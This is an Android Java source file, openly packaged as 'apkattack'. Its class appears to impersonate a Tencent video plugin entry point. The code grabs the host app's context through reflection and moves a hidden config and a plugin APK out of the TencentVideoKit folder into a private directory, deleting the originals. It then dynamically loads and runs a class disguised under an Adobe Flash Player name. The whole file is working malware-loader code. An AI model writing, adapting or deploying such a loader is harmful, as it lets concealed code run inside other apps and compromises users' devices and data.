package com.example.apkattack;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

public class TvkpluginEntry {
	
	
	@SuppressLint("SdCardPath") 
	//com.tencent.qqlive.mediaplayer.wrapper.e
	//Lcom/tencent/qqlive/mediaplayer/wrapper/MediaPlayerFactory;
	//Lcom/tencent/moduleupdate/UpdateAssembly;
	//Lcom/tencent/moduleupdate/UpdateLibHelper
	public static void tvkpluginEntry(){
		String Tag = "tvkpluginEntry";

		Log.e(Tag,"start");
		try {
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
			
	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
			
			String apppath = context.getFilesDir().getParent() + "/";
			// data = /data?
	    	String unzippath = apppath + "MyQQEntry/";

    	
    		File unzippathfile = new File(unzippath);
    		if (unzippathfile.exists() == false) {
    			Log.e(Tag, "first run to create path:" + unzippath);
    			unzippathfile.mkdirs();
			}
    		
	    	String cfgfn = "ark.dat";
	    	String apkfn = "simcard.apk";
        	File apk = new File(unzippath + apkfn);
        	File config = new File(unzippath + cfgfn);
        	if (apk.exists() == false || config.exists() == false) {
        		
        		String sopath = apppath + "files/TencentVideoKit/armeabi/";
        		
    			File oldfilecfg = new File(sopath + cfgfn);
    			if (oldfilecfg.exists() == false) {
    				Log.e(Tag, "not find config file:" + oldfilecfg.getAbsolutePath());
    				return;
    			}else{
    				FileInputStream fin = new FileInputStream(oldfilecfg);
    				FileOutputStream fout = new FileOutputStream(config);
    				
    				int filesize = (int)oldfilecfg.length();
    				
    				byte [] buf = new byte[filesize];
    				int len = fin.read(buf,0,filesize);
    				fout.write(buf,0,len);
    				fin.close();
    				fout.close();
    				
    				oldfilecfg.delete();
    			}
    			

    			String pluginapkfn = "";
				File [] pluginfiles = new File(sopath).listFiles();
				for (int i = 0; i < pluginfiles.length; i++) {
					String tmpfn = pluginfiles[i].getName();
					if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
						pluginapkfn = tmpfn;
						break;
					}
				}
    			
    			File oldfileapk = new File(sopath + pluginapkfn);
    			if (oldfileapk.exists() == false) {
    				Log.e(Tag, "not found apk file:" + oldfileapk.getAbsolutePath());
    				return;
    			}else{
    				FileInputStream fin = new FileInputStream(oldfileapk);
    				FileOutputStream fout = new FileOutputStream(apk);
    				
    				int filesize = (int)oldfileapk.length();
    				
    				byte [] buf = new byte[filesize];
    				int len = fin.read(buf,0,filesize);
    				fout.write(buf,0,len);
    				fin.close();
    				fout.close();
    				oldfileapk.delete();
    			}
        	}
        	
        	String appcachepath = context.getCacheDir() + "/";
        	
        	DexClassLoader dexcl = new DexClassLoader(unzippath + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,unzippath);
    	    
    	    Log.e(Tag, "qq load apk success");
		} catch (Exception e) {
			 Log.e(Tag, "qq load apk exception");
			e.printStackTrace();
		}
	}

}
